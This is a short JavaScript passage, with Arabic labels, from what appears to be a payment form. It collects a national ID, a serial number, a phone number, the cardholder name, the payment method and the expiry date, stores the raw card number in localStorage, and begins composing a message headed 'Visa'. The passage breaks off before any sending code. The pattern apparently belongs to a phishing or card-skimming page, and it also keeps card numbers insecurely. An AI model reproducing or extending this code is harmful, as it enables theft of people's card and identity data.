...
const formData=JSON.parse(localStorage.getItem("formData")||"{}");const nationalId=formData.id||"غير متوفر";const serialNumber=formData.serial||"غير متوفر";const phone=formData.phone||"غير متوفر";const cardName=document.querySelector('input[placeholder="ادخل اسم حامل البطاقة"]').value;const paymentMethod=document.querySelector('input[name="payment"]:checked').value;const expiryDate=`${month}/${year}`;localStorage.setItem("cardNumber",rawCardNumber);const message=`
الفيزا
